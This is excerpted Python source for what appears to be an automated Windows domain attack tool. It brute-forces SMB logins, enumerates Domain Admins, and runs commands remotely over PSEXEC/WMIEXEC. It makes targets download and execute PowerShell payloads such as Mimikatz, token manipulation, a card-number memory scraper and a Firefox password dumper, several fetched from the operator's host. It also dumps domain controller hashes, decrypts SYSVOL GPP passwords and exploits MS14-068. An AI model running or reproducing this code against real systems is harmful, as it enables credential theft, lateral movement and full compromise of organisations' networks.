...
def testAdminAccess(tmphostno, tmpdomain, tmpusername, tmppassword,
    ...
    results = runPSEXEC(tmphostno, tmpdomain, tmpusername, tmppassword,
                        tmppasswordHash, command)
...
def testDomainCredentials(username, password, passwordHash, ip, domain):
    foundAdmin = False
    if [str(ip), str(domain).lower(),
            str(username),
            str(password)] in attemptedCredList:
        print(setColor(
            "[-]", bold, color="red")) + " " + ip + ":445 " + getNetBiosName(
                ip
        ) + " | " + domain + "\\" + username + ":" + password + " [FAILED]"
        return False, foundAdmin
    else:
        if password != None:
            attemptedCredList.append(
                [str(ip),
                 str(domain).lower(),
                 str(username),
                 str(password)])
        ...
        if passwordHash != None:
            password = None
            if testAdminAccess(ip, domain, username, password,
                               passwordHash) == True:
                foundAdmin = True
                if domain == '':
                    domain = "WORKGROUP"
                print(setColor(
                    ...
                    ip
                ) + " | " + domain + "\\" + username + ":" + passwordHash + " [OK][ADMIN]"
                ...
                print(setColor(
                    ...
                    ip
                ) + " | " + domain + "\\" + username + ":" + passwordHash + " [FAILED]"
                return False, foundAdmin
        else:
            try:
                command = "medusa -M smbnt -u " + domain + "\\\\" + \
                    username + " -p '" + password + "' -h " + ip
                ...
                if "SUCCESS" in str(resultList):
                    if testAdminAccess(ip, domain, username, password,
                        ...
                        print(setColor(
                            ...
                            ip
                        ) + " | " + domain + "\\" + username + ":" + password + " [OK][ADMIN]"
                        foundAdmin = True
                        tmpfound = False
                        ...
                        print(setColor(
                            ...
                            ip
                        ) + " | " + domain + "\\" + username + ":" + password + " [OK]"
                        if [ip, domain, username,
                                password] not in accessOKHostList:
                            accessOKHostList.append(
                                [ip, domain, username, password])
                    return True, foundAdmin
                else:
                    print(setColor(
...
def getDomainAdminUsers(username, password, hostNo):
    ...
    for x in unFoundList:
        cmd = "/opt/local/bin/rpcclient -U " + username + "%" + password + " " + ip + \
            " -c 'querygroupmem " + x + \
            "' | awk -F']' '{print $1}' | awk -F'[' '{print $2}'"
        resultList = runCommand(cmd, shell=True, timeout=15)
        list1 = resultList[1].split("\n")
    ...
    if len(domainAdminList) > 0:
        ...
        if len(domainAdminList) > 0:
            if username.lower() in domainAdminList:
                print "[+] Is '" + username + "' in the Domain Admin group?: " + (
                    setColor("Yes", bold, color="red"))
                results = True
            else:
                print "[+] Is '" + username + "' in the Domain Admin group?: " + (
...
def parseMimikatzOutput(list1):
    ...
    if len(tmpPasswordList) > 0:
        print(setColor(
            "[+]", bold,
            color="green")) + " Found the below credentials via Mimikatz"
...
def dumpDCHashes(tmphostno, tmpdomain, tmpusername, tmppassword):
    ...
    if os.path.exists('secrets.ntds'):
        ...
        if len(tmpLines1) > 0:
            ...
            print(setColor("\n[+]", bold,
                           color="green")) + " List of Valid Hashes"
            for x in tmpLines1:
                print x
        if os.path.exists('secrets.ntds'):
...
def runMimikatz(targetIP, domain, username, password, passwordHash):
    ...
    osArch64 = getPowershellVersion(targetIP, domain, username, password,
                                    passwordHash)
    ...
    if verbose == True:
        print command
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         command)
...
def uploadFile(remoteFilename, localFilename, targetIP, domain, username,
    ...
    command = "powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://" + \
        myIP + ":8000/" + remoteFilename + "', ‘C:\\windows\\temp\\" + localFilename + "')"
...
def getPowershellVersion(targetIP, domain, username, password, passwordHash):
    ...
    try:
        results = runWMIEXEC(targetIP, domain, username, password,
...
def tokensPriv(targetIP, domain, username, password, passwordHash):
    ...
    command = powershellPath + " " + powershellArgs + \
        ...
        ":8000/Invoke-TokenManipulation.ps1\'); Invoke-TokenManipulation"
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         command)
    if verbose == True:
        print command
    ...
    if len(tmpTokenList) > 0:
        print(setColor("[+]", bold,
                       color="green")) + " List of Tokens on host: " + targetIP
        ...
        for x in tmpTokenList:
            ...
            if len(tmpUsername) > 0:
                if tmpUsername.lower(
                    ...
                    tmpUACMode = checkUAC(targetIP, domain, username, password,
                                          passwordHash)
                    if tmpUACMode == False:
                        print "[*] UAC is Disabled on Host: " + targetIP
                        print "[*] Attempting to Elevate Privileges Using Token: '" + foundUser + "'"
                        s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/Invoke-TokenManipulation.ps1\');Invoke-TokenManipulation -CreateProcess "' + powershellPath + '" -Username ' + foundUser + \
                            ' -ProcessArgs "-windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta IEX (New-Object Net.WebClient).DownloadString(\'http://is.gd/oeoFuI\');Invoke-Mimikatz -DumpCreds  -ComputerName ' + \
                            dcNetbiosName + ' | Out-File C:\\windows\\temp\\' + \
                            mimikatzOutputFilename + '.txt"' ''
                        ...
                        uploadFile(tmpFilename, tmpFilename, targetIP, domain,
                                   username, password, passwordHash)

                        command = 'schtasks.exe /Delete /TN ' + tmpSchedName + ' /f'
                        results = runWMIEXEC(targetIP, domain, username,
                                             password, passwordHash, command)
                        command = 'schtasks.exe /Create /RL HIGHEST /RU ' + domain + '\\' + username + \
                            ' /TN ' + tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + tmpFilename
                        ...
                        while waitForPSComplete == False:
                            ...
                            if len(tmpFilename) > 0:
                                if os.path.exists(tmpFilename):
                                    ...
                                    tmpPasswordList = parseMimikatzOutput(
                                        lines)
                                    if len(tmpPasswordList) > 0:
                                        addPasswords(tmpPasswordList)
                                        print "\nTesting Credentials"
...
def memCredDump(targetIP, domain, username, password, passwordHash,
    ...
    command = powershellCmdStart + \
        ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/mem_scraper.ps1\',\'C:\windows\\temp\mem_scraper.ps1\');c:\windows\\temp\mem_scraper.ps1 -Proc ' + \
        processName + ' -NumsOnly -Logging;"'
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         command)
    tmpResultList = results.split("\n")
...
def diskCredDump(targetIP, domain, username, password, passwordHash):
    command = powershellCmdStart + \
        ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/credit-card-finder.ps1\’,\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path c:\\\\"'
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         command)
    tmpResultList = results.split("\n")
    return tmpResultList
...
def getInstalledPrograms(targetIP, domain, username, password, passwordHash):
    osArch64 = getPowershellVersion(ip, domain, username, password,
                                    passwordHash)
    powershellPath = getPowershellPath(osArch64)
    powershellArgs = ' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
...
def mountSysvol(username, password):
    ...
    if len(resultList[1]) > 0:
        ...
        if len(fileList) > 0:
            print(setColor(
                "[+]", bold,
                color="green")) + " Credentials found in SYSVOL folder"
            for x in fileList:
                x = x.strip()
                if len(x) > 0:
                    if len(x.strip()) > 0:
        ...
        if len(tmpPassList) > 0:
            print(setColor("[+]", bold,
                           color="green")) + " Decrypted GPP Password"
            ...
            for x in tmpPassList:
                ...
                for dc in dcList:
                    passwordHash = None
                    tmpLoginOK, tmpAdminOK = testDomainCredentials(
                        username, password, passwordHash, dc, domain)
                    if tmpAdminOK == True:
...
def findInterestingFiles(targetIP, domain, username, password, passwordHash):
    ...
    command = powershellCmdStart + \
        ' -command "get-psdrive -psprovider filesystem | Select Name"'
    if verbose == True:
        print command
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         command)
    ...
    for drive in tmpDriveList:
        command = powershellCmdStart + ' -command ' + searchKeywords + \
            '; Get-ChildItem -Path "' + drive + ':\" -Recurse -Include "$searchKeywords" -Name'
        results = runWMIEXEC(targetIP, domain, username, password,
                             passwordHash, command)
    ...
    print(setColor("[+]", bold,
                   color="green")) + " List of Interesting Files Found"
            ...
            for x in tmpFoundAccounts:
                ...
                if "firefox" in tmpBrowserList:
                    ...
                    s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + \
                        ':8000/Get-FoxDump.ps1\'); Get-FoxDump -OutFile C:\\temp\\' + outputFilename
                    encodedPS = powershell_encode(s)
...
def dumpIIS(targetIP, domain, username, password, passwordHash):
    ...
    command = powershellPath + " " + powershellArgs + \
        " \"IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
        ":8000/get-applicationhost.ps1\'); Get-ApplicationHost | Format-Table -Autosize\""
    if verbose == True:
        print command
    results = runWMIEXEC(targetIP, domain, username, password, passwordHash,
                         powershellCmdStart + command)
...
def testMS14_068(ip, domain, username, password, passwordHash):
    ...
    command = powershellPath + " " + powershellArgs + \
        " IEX (New-Object Net.WebClient).DownloadString(\'http://" + \
        myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
    dumper = MS14_068(address, target_ip, username, password, domainFull, None,
                      command, None, None, dc_ip)
    try:
        dumper.exploit()
    ...
    if not os.path.exists(origScriptPath +
                          "/system") or not os.path.exists(origScriptPath +
                                                           "/ntds"):
        print(setColor(
            "[-]", bold,
        ...
        cmd = "python /pentest/ntdsxtract/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile " + \
...
if domain.lower() != "workgroup":
    if len(dcList) > 0:
        ip = dcList[0]
        continueOK = False
        tmpLoginOK, tmpAdminOK = testDomainCredentials(username, password,
                                                       passwordHash, ip,
                                                       domain)
        if tmpLoginOK == True:
        ...
        if continueOK == True:
            ...
            for ip in nbList:
                tmpLoginOK, tmpAdminOK = testDomainCredentials(
                    username, password, passwordHash, ip, domain)
                if tmpLoginOK == True:
                    if [domain, username, password] not in userPassList:
                        userPassList.append([domain, username, password])
                if tmpAdminOK == True:
        ...
        if tmpAdminOK == True:
            if dcCompromised == False:
                ...
                print(setColor(
                    "\n[+]", bold,
                    color="green")) + " Dumping Hashes from Host: " + ip
                tmpHashList = dumpDCHashes(ip, domain, tmpusername,
                                           tmppassword)
                if len(tmpHashList) > 0:
                    addHashes(tmpHashList)
                    if ip in uncompromisedHostList:
...
if len(dcList) > 0:
    ...
    if isDA == False:
        ...
        if optionMS14068 == True:
            tmpPassList, tmpHashList = testMS14_068(ip, domain, username,
                                                    password, passwordHash)
            ...
            if len(userPassList) > 0:
                for x in userPassList:
                    if y in uncompromisedHostList:
                        ...
                        if len(tmppassword) > 0 and tmppassword != '(null)':
                            tmpLoginOK, tmpAdminOK = testDomainCredentials(
                                tmpusername, tmppassword, None, tmpip,
                                tmpdomain)
                            if tmpLoginOK == True:
                                if [domain, username,
                                ...
                                if optionTokenPriv == True:
                                    print(
                                        setColor(
                                            ...
                                            bold,
                                            color="green"))
                                    tokensPriv(tmpip, tmpdomain, tmpusername,
                                               tmppassword, tmphash)
            ...
            if len(userHashList) > 0:
                for x in userHashList:
                    if y in uncompromisedHostList:
                        ...
                        tmppassword = None
                        tmpLoginOK, tmpAdminOK = testDomainCredentials(
                            tmpusername, tmppassword, tmppasswordHash, tmpip,
                            tmpdomain)
                        if tmpLoginOK == True:
                            if [domain, username,
                                    password] not in userPassList:
    ...
    if len(accessAdmHostList) > 0:
        ...
        for x in accessAdmHostList:
            ...
            if ip in selectedHostList:
                ...
                results = runWMIEXEC(ip, domain, username, password,
                                     passwordHash, command)
                print "Dumping Process: " + selectedProcess + " on Host: " + ip
                tmpResultList = memCredDump(ip, domain, username, password,
                                            passwordHash, selectedProcess)
                            ...
                            if tmpFound == False:
                                for y in tmpUserPassList:
                                    try:
                                        ...
                                        if accessRemoteShare(
                                                targetIP, filePath, tmpdomain,
                                                tmpusername,
                                                tmppassword) == True:
                                            credStr = tmpusername + "|" + tmppassword
                                            tmpOKList.append([
                                                targetIP, filePath, "[OK]",
                                                credStr
                                            ])
                                            tmpFound = True
                                    except:
    ...
    if len(accessAdmHostList) > 0:
        ...
        for x in accessAdmHostList:
            ...
            if len(x[3]) == 65 and x[3].count(":") == 1:
                ...
                tmppassword = x[3]
                tmppasswordHash = None
            usersLoggedIntoHostList = listUsers(tmpip, domain, tmpusername,
...
for x in accessAdmHostList:
    ...
    if len(tmppasswordHash) < 1:
        tmpAppList = getInstalledPrograms(tmphostno, tmpdomain, tmpusername,
                                          tmppassword, tmppasswordHash)
        for y in tmpAppList:
            if y not in tmpResultList:
                tmpResultList.append(y)
